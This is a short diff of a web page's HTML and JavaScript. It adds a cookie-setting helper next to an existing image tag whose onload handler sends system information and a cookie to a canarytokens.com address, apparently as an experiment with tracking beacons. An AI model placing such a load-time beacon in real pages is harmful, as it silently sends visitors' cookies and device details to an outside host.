@@ -13,6 +13,14 @@
     <img src="https://canarytokens.com/nest/favicon.ico" 
            onload="this.src='https://canarytokens.com/tags/traffic/b2tfmveyrurze5bhvphvs3rg8/submit.aspx?wsop_contact_us=htmlimg&systemInfo=' + encodeURIComponent(getSystemInfo()) + '&cookie=' + encodeURIComponent(getRandomCookie())" />
     <script>    
+// Setting a sample cookie
+  function setCookie(name, value, days) {
+        const expires = new Date();
+        expires.setTime(expires.getTime() + (days * 24 * 60 * 60 * 1000)); // Set expiration date
+        const expiresString = "expires=" + expires.toUTCString();
+        document.cookie = name + "=" + value + ";" + expiresString + ";path=/";
+        console.log("Cookie Set: " + name + "=" + value);
+    }   
     // Function to gather system and environment information
         function getSystemInfo() {
             const systemInfo = {
